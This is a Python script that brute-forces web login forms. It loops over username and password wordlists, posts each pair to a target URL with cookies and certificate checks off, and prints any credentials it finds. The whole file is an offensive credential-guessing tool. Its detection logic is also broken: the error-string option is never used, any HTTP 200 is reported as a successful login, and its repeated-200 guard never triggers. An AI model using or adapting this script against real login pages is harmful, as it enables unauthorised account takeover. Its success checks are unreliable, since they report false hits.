#!/usr/bin/env python3
#web-brute.py : @jockemedlinux 2023-04-09     Not universal  		   #
#Version v1.0: Bruteforcing web login form easily with cookies support #
########################################################################
import requests,argparse,sys
def login(url, username, password, cookies):
	consecutive_200s = 0
	response = requests.post(url, data={
		args.f1: username, #Make sure the casing is correct!
		args.f2: password, #Make sure the casing is correct!
		args.f3: args.f3,
	},
		verify=False,
		headers=cookies,
	)
	if response.status_code == 200:
		consecutive_200s += 1
		if consecutive_200s >= 10:
			print("""
You've had more than 10 'HTML 200' response in a row.
Something is probably wrong with your formdata..
Check the casing.""")
			sys.exit()
		return response.text
	else:
		consecutive_200s = 0
		return

if __name__ == "__main__":
	parser = argparse.ArgumentParser("bruteforcer.py")
	parser.add_argument("-H", type=str, help="The URL", required=True)
	parser.add_argument("-U", type=str, help="Usernames file", required=True)
	parser.add_argument("-P", type=str, help="Passwords file", required=True)
	parser.add_argument("-s", type=str, help="Error response from page. ('Username incorrect')", required=False)
	parser.add_argument("-C", type=str, help="Cookies data (The value only)", required=False)
	parser.add_argument("-f1", type=str, help="form data #1 (Username)", required=True)
	parser.add_argument("-f2", type=str, help="form data #2 (Password)", required=True)
	parser.add_argument("-f3", type=str, help="form data #3 (Submit)", required=False, default="Login")

	args = parser.parse_args()

	url = args.H
	cookies = {"Cookie":args.C} if args.C else None
	print("-" * 100)
	print("\nAttacking: %s\n" % (url))
	print("-" * 100)

	creds = []
	try:
		with open(args.U, "r") as userfile:
			usernames = [line.strip() for line in userfile.read().split("\n") if line]
		with open(args.P, "r") as passfile:
			passwords = [line.strip() for line in passfile.read().split("\n") if line]
		counter = 1
		for username in usernames:
			for password in passwords:
				logins = login(url, username, password, cookies)
				if not logins:
					print(f"Tried {username}:{password:<20} | so far we've done {counter} attempts")
					counter += 1
					continue
				else:
					print(f"\033[91m## Login Found ## \n{username}:{password}\033[0m")
					creds.append(username + ":" + password)
		if creds:
			print("\nThese credentials were found!")
			print(creds)
		else:
			print("\nNo credentials found..")
	except KeyboardInterrupt:
		if creds:
			print("\nThese credentials were found!")
			print(creds)
		else:
			print("\nNo credentials found..")
		print("\nInterrupted by user. Quitting...")